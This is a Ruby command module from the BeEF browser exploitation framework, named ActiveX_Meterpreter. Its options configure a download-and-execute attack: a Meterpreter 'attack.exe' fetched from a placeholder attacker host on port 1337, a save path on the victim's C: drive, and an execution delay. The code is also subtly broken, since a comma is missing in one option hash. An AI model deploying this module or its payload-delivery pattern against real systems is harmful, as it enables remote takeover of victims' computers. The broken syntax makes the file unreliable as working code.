#
# Copyright (c) 2006-2014 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
class ActiveX_Meterpreter < BeEF::Core::Command

	def self.options
	    return [{
	      'name'=>'local_path', 
	      'ui_label' => 'Local Meterpreter Path',
	      'description' => 'Enter the path for your meterpreter payload.', 
	      'type'=>'input',  
	      'value'=>'http://myipaddress:1337/public/attack.exe'
	    },
	    {
	      'name' => 'remote_path',
	      'ui_label' => 'Remote Save Path',
	      'description' => 'Enter the remote path to save the payload (use c:\\payload\\attack.exe for proper escaping.)' 
	      'type' => 'input',
	      'value' => 'c:\\temp\\attack.exe'
	    },
	    {
	      'name' => 'delay',
	      'ui_label' => 'Execution Delay',
	      'description' => 'Number of miliseconds (after download begins) to execute payload.', 
	      'type' => 'input',
	      'value' => '1500'
	    }]
	end

	def post_execute 
	end

end
